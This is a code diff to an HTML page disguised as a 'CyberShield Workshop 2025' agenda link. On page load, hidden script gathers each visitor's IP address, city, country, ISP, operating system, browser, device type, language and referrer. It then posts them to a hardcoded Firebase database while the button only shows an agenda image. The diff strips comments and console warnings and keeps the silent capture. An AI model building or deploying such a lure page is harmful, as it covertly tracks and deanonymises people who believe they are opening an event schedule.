@@ -69,10 +69,38 @@
   }
   .btn:hover { background: #2d2d4e; transform: translateY(-1px); }
   .small { font-size: 0.78rem; color: #bbb; margin-top: 1rem; margin-bottom: 0; }
+  .agenda-container {
+    text-align: center;
+    background: #fff;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    padding: 2rem;
+  }
+  .agenda-img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 20px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+  }
+  .back-btn {
+    margin-top: 2rem;
+    background: #1a1a2e;
+    color: #fff;
+    border: none;
+    padding: 0.8rem 2rem;
+    border-radius: 40px;
+    font-family: 'Syne', sans-serif;
+    font-size: 0.9rem;
+    font-weight: 700;
+    cursor: pointer;
+  }
 </style>
 </head>
 <body>
-<div class="card">
+<div class="card" id="welcomeCard">
   <div class="logo">
     <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
       <path d="M18 4L6 9v9c0 7.18 5.14 13.89 12 15.5C24.86 31.89 30 25.18 30 18V9L18 4z" fill="#fff" opacity="0.9"/>
@@ -82,19 +110,21 @@
   <div class="tag">CyberShield Workshop 2025</div>
   <h1>Welcome!<br>View Today's Agenda</h1>
   <p>Tap the button below to access the session schedule, speaker list, and room details.</p>
-  <button class="btn" onclick="redirectToAgenda()">Open Workshop Agenda &rarr;</button>
+  <button class="btn" onclick="showAgendaImage()">Open Workshop Agenda &rarr;</button>
   <p class="small">Powered by CyberShield Events</p>
 </div>
 
 <script>
   // ============================================================
-  //  🔁 REPLACE WITH YOUR ACTUAL FIREBASE DATABASE URL
+  //  🔁 REPLACE WITH YOUR FIREBASE DATABASE URL
   const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/";
+  //  🖼️ REPLACE WITH YOUR ACTUAL AGENDA IMAGE URL (local or full link)
+  const AGENDA_IMAGE_URL = "YOUR_AGENDA_IMAGE_URL_HERE";  // e.g., "agenda.jpg" or "https://example.com/schedule.png"
   // ============================================================
 
   let dataSent = false;
 
-  // ---------- Device / OS / Browser (same as before) ----------
+  // ---------- Device / OS / Browser ----------
   function getOS(ua) {
     if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
     if (/Windows NT 6/.test(ua))  return 'Windows 7/8';
@@ -130,9 +160,8 @@
     return 'Desktop / Laptop';
   }
 
-  // ---------- Get IP + City + Country (ONLY HTTPS APIs, with timeout) ----------
+  // ---------- IP + City + Country (HTTPS APIs with fallback) ----------
   async function getLocationData() {
-    // List of HTTPS geolocation APIs (tried in order)
     const apis = [
       {
         url: 'https://ipapi.co/json/',
@@ -166,25 +195,22 @@
     for (const api of apis) {
       try {
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
         const res = await fetch(api.url, { signal: controller.signal });
         clearTimeout(timeoutId);
         if (res.ok) {
           const data = await res.json();
           const parsed = api.parse(data);
-          // If we got at least an IP, return it
           if (parsed.ip && parsed.ip !== '—') return parsed;
         }
       } catch (e) {
-        console.warn(`API ${api.url} failed:`, e);
         continue;
       }
     }
-    // Fallback if all APIs fail
     return { ip: '—', city: '—', country: '—', isp: '—' };
   }
 
-  // ---------- Main capture & send ----------
+  // ---------- Capture and send to Firebase ----------
   async function captureAndSend() {
     if (dataSent) return;
     dataSent = true;
@@ -197,7 +223,6 @@
     const language = navigator.language || '—';
     const time = new Date().toLocaleString();
 
-    // Get IP, city, country, ISP (now works on mobile too)
     const { ip, city, country, isp } = await getLocationData();
 
     const visitorData = {
@@ -215,31 +240,30 @@
       referrer: document.referrer || 'direct'
     };
 
-    // Send to Firebase
     try {
       await fetch(`${FIREBASE_URL}/visitors.json`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(visitorData)
       });
-      console.log('✅ Visitor data logged to Firebase', visitorData);
+      console.log('✅ Visitor data logged', visitorData);
     } catch (err) {
       console.error('❌ Firebase error:', err);
     }
   }
 
-  function redirectToAgenda() {
-    // Change this to your actual agenda page if needed
+  // ---------- Show agenda image instantly (no loading message) ----------
+  function showAgendaImage() {
+    // Replace whole body with the agenda image and a back button
     document.body.innerHTML = `
-      <div style="font-family:sans-serif;text-align:center;padding:3rem;">
-        <h2 style="color:#1a1a2e;">Loading agenda...</h2>
-        <p style="color:#888;margin-top:1rem;">Please wait a moment.</p>
-      </div>`;
-    // Uncomment to redirect to another URL:
-    // window.location.href = "https://your-agenda.com";
+      <div class="agenda-container">
+        <img src="${AGENDA_IMAGE_URL}" alt="Workshop Agenda" class="agenda-img" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22300%22%20height%3D%22200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%23f0f0f0%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23999%22%3EImage%20not%20found%3C%2Ftext%3E%3C%2Fsvg%3E';">
+        <button class="back-btn" onclick="location.reload()">← Back to Welcome</button>
+      </div>
+    `;
   }
 
-  // 🔥 Capture immediately on page load (works on PC & mobile)
+  // Capture data immediately on page load
   window.addEventListener('load', () => {
     captureAndSend();
   });
